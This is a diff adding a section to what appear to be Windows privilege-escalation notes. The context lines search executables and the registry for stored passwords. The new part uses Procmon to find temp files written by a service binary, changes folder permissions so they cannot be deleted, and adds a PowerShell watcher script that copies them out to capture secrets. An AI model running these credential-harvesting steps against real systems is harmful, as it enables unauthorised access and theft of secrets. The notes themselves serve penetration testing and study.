@@ -76,3 +76,45 @@ Select-String -Path .\*.exe -Pattern "password|username|secret" -Encoding Byte
 reg query HKLM /f "password" /t REG_SZ /s
 reg query HKCU /f "password" /t REG_SZ /s
 ```
+
+# Procmon Analyze
+```powershell
+.\Restart-OracleService.exe
+
+Procmon --> Filter --> Process Name (Restart-OracleService.exe) --> Operation (CreateFile)
+```
+<img width="932" height="41" alt="image" src="https://github.com/user-attachments/assets/c2f83141-363e-4004-8ef1-7d0c9321e8df" />
+```powershell
+C:\Users\cybervaca\AppData\Local\Temp
+
+Properties -> Security -> Advanced -> cybervaca -> Disable inheritance -> Convert inherited permissions into explicit permissions on this object -> Edit -> Show advanced permissions, we deselect the Delete subfolders and files, and Delete checkboxes.
+```
+
+```powershell
+$sourcePath = "C:\Users\cybervaca\AppData\Local\Temp"
+$destinationPath = "C:\TempKopyalar"
+if (!(Test-Path -Path $destinationPath)) {
+    New-Item -ItemType Directory -Path $destinationPath
+}
+$watcher = New-Object System.IO.FileSystemWatcher
+$watcher.Path = $sourcePath
+$watcher.Filter = "*.*"
+$watcher.IncludeSubdirectories = $true
+$watcher.EnableRaisingEvents = $true
+$action = {
+    $path = $Event.SourceEventArgs.FullPath
+    $name = $Event.SourceEventArgs.Name
+    $changeType = $Event.SourceEventArgs.ChangeType
+    if ($changeType -eq "Created") {
+        try {
+            Start-Sleep -Seconds 1
+            $destFile = Join-Path $destinationPath $name
+            Copy-Item -Path $path -Destination $destFile -Force
+        } catch {}
+    }
+}
+Register-ObjectEvent $watcher "Created" -Action $action
+while ($true) { Start-Sleep -Seconds 5 }
+```
+<img width="935" height="422" alt="image" src="https://github.com/user-attachments/assets/6034a9fa-7151-4de9-91f0-d5934ff94deb" />
+
